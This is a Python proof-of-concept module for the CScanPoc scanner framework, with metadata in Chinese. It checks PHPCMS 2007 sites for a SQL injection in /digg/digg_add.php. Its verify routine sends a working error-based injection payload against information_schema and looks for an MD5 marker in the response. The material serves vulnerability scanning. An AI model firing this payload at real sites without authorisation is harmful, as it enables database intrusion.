# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'PHPCMS_0026' # 平台漏洞编号，留空
    name = 'PHPCMS 2007 /digg_add.php SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-11-30'  # 漏洞公布时间
    desc = '''
        PHPCMS 2007 /digg_add.php SQL注入漏洞。
    ''' # 漏洞描述
    ref = 'http://vul.1aq.com/index.php/vul/JDSEC-POC-20141129-4654' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'PHPCMS'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'fa17e854-112c-4fa7-af3f-f84c4a3625b8'
    author = '国光'  # POC编写者
    create_date = '2018-05-25' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = arg
            payload = ("/digg/digg_add.php?id=1&con=2&digg_mod=digg_data+WHERE+1%3d2+%2band(select+1+from(select+count(*)%2cconcat((select+(select+(select+concat(0x7e%2cmd5(3.1415)%2c0x7e)))+from+information_schema.tables+limit+0%2c1)%2cfloor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)%2523")
            code, head, body, _, _ = hh.http(url + payload)
            if body and body.find('63e1f04640e83605c1d177544a5a0488') != -1:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()